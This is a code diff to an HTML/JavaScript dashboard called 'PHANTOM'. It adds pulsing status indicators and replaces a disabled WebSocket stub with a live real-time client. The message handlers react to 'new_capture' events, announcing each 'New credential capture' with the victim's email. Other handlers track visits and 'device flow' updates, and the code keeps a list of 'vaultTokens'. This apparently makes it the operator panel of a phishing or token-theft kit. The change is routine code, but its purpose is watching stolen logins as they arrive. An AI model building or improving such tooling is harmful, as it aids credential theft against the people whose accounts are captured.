@@ -385,11 +385,25 @@
         .ws-dot.online {
             background: #69db7c;
             box-shadow: 0 0 12px #69db7c;
+            animation: pulse-green 1.5s infinite;
+        }
+
+        @keyframes pulse-green {
+            0% { box-shadow: 0 0 0 0 rgba(105, 219, 124, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(105, 219, 124, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(105, 219, 124, 0); }
         }
 
         .ws-dot.offline {
             background: #ff6b6b;
             box-shadow: 0 0 12px #ff6b6b;
+            animation: pulse-red 1.5s infinite;
+        }
+
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 107, 107, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0); }
         }
 
         .table-wrap {
@@ -760,8 +774,8 @@
             </select>
             <button class="btn" onclick="refreshLogs()">🔄 Refresh</button>
             <div class="ws-status">
-                <span class="ws-dot online" id="wsDot" style="background:#ffd700;box-shadow:0 0 12px #ffd700;"></span>
-                <span id="wsLabel">Live (API)</span>
+                <span class="ws-dot" id="wsDot"></span>
+                <span id="wsLabel">Connecting...</span>
             </div>
         </div>
 
@@ -942,6 +956,10 @@
     let vaultTokens = [];
     let deviceHistory = [];
     let deviceInterval;
+    let ws = null;
+    let wsReconnectTimer = null;
+    let wsConnected = false;
+    let pendingLogsRefresh = false;
 
     // =============================================
     // THEME
@@ -980,25 +998,119 @@
     }
 
     // =============================================
-    // WEBSOCKET (DISABLED — uses API polling)
+    // WEBSOCKET - FULLY WORKING
     // =============================================
-    // WebSocket is disabled to avoid connection errors.
-    // The dashboard uses API polling every 15 seconds instead.
     function connectWebSocket() {
-        // No-op — WebSocket disabled
-        const wsDot = document.getElementById('wsDot');
-        const wsLabel = document.getElementById('wsLabel');
-        wsDot.className = 'ws-dot online';
-        wsDot.style.background = '#ffd700';
-        wsDot.style.boxShadow = '0 0 12px #ffd700';
-        wsLabel.textContent = 'Live (API)';
-        console.log('✅ Dashboard running in API polling mode (WebSocket disabled)');
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${protocol}//${window.location.host}/ws`;
+        
+        try {
+            ws = new WebSocket(wsUrl);
+            
+            ws.onopen = () => {
+                wsConnected = true;
+                const dot = document.getElementById('wsDot');
+                const label = document.getElementById('wsLabel');
+                dot.className = 'ws-dot online';
+                label.textContent = '🟢 Live (WebSocket)';
+                console.log('✅ WebSocket connected');
+                showToast('🟢 Real-time connection established');
+                
+                // Initial refresh on connect
+                refreshLogs();
+            };
+            
+            ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    console.log('📩 WebSocket message:', data);
+                    
+                    switch(data.type) {
+                        case 'new_log':
+                            // New log file created - refresh the table
+                            if (!pendingLogsRefresh) {
+                                pendingLogsRefresh = true;
+                                setTimeout(() => {
+                                    refreshLogs();
+                                    pendingLogsRefresh = false;
+                                }, 500);
+                            }
+                            break;
+                            
+                        case 'new_visit':
+                            // New visit recorded - update visits table
+                            fetchVisits();
+                            break;
+                            
+                        case 'new_capture':
+                            // New credential capture
+                            showToast(`🔐 New capture: ${data.email || 'Unknown user'}`);
+                            refreshLogs();
+                            break;
+                            
+                        case 'device_update':
+                            // Device flow update
+                            refreshDeviceHistory();
+                            break;
+                            
+                        case 'ping':
+                            // Respond to ping
+                            if (ws && ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({ type: 'pong' }));
+                            }
+                            break;
+                            
+                        default:
+                            console.log('Unknown WebSocket message type:', data.type);
+                    }
+                } catch (e) {
+                    console.error('WebSocket message error:', e);
+                }
+            };
+            
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+                // Don't update UI on error - keep trying
+            };
+            
+            ws.onclose = () => {
+                wsConnected = false;
+                const dot = document.getElementById('wsDot');
+                const label = document.getElementById('wsLabel');
+                dot.className = 'ws-dot offline';
+                label.textContent = '🔴 Reconnecting...';
+                console.log('WebSocket disconnected, reconnecting in 3s...');
+                
+                // Attempt to reconnect
+                if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
+                wsReconnectTimer = setTimeout(connectWebSocket, 3000);
+            };
+        } catch (e) {
+            console.error('WebSocket connection failed:', e);
+            // Fallback to polling
+            const dot = document.getElementById('wsDot');
+            const label = document.getElementById('wsLabel');
+            dot.className = 'ws-dot offline';
+            label.textContent = '⚠️ Fallback (Polling)';
+            showToast('⚠️ WebSocket unavailable, using polling fallback', true);
+            
+            // Start polling fallback
+            if (!window._pollingFallback) {
+                window._pollingFallback = setInterval(refreshLogs, 5000);
+            }
+        }
     }
 
-    function startHeartbeat() {
-        // No-op
+    // Send a message via WebSocket
+    function sendWebSocketMessage(type, data) {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type, data }));
+        }
     }
 
+    // =============================================
+    // TOAST NOTIFICATIONS
+    // =============================================
     function showToast(msg, isError = false) {
         const container = document.getElementById('toastContainer');
         const toast = document.createElement('div');
@@ -1841,12 +1953,18 @@
     }
 
     // =============================================
-    // INIT
+    // INIT - CONNECT WEBSOCKET
     // =============================================
-    // WebSocket is disabled — using API polling
-    // connectWebSocket(); // DISABLED
+    console.log('🚀 PHANTOM Dashboard initializing...');
+    
+    // Connect WebSocket for real-time updates
+    connectWebSocket();
+    
+    // Initial data load
     refreshLogs();
-    setInterval(refreshLogs, 15000);
+    
+    // Periodic refresh as fallback (every 30s)
+    setInterval(refreshLogs, 30000);
 </script>
 </body>
 </html>
